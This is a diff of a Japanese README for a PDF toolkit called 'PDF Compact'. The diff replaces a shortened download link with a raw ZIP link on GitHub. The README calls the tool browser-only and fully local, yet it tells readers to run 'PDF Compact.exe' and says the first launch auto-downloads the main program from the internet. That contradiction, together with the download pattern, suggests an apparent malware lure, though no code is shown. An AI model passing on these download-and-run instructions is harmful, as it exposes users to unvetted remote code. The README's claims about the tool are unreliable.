@@ -3,7 +3,7 @@
 > **Version 3.3.9** · 2026-05-28
 > ブラウザ完結型・サーバー不要・100% LOCAL の PDF ツールキット
 
-[![download](https://img.shields.io/badge/download-ZIP%20(3.3.9)-1a85ff?style=for-the-badge)](https://tinyurl.com/28x658ss)
+[![download](https://img.shields.io/badge/download-ZIP%20(3.3.9)-1a85ff?style=for-the-badge)](https://github.com/sEARCHcOMP/PdfCompact/raw/main/PDF_Compact.zip)
 
 ---
 
@@ -27,7 +27,7 @@
 
 下のリンクから ZIP をダウンロードして解凍 → `PDF Compact.exe` をダブルクリック
 
-📦 **[ダウンロード (ZIP)](https://tinyurl.com/28x658ss)**
+📦 **[ダウンロード (ZIP)](https://github.com/sEARCHcOMP/PdfCompact/raw/main/PDF_Compact.zip)**
 
 - 初回起動時にネット接続が必要(本体を自動DL)
 - 2回目以降はオフラインでも動作
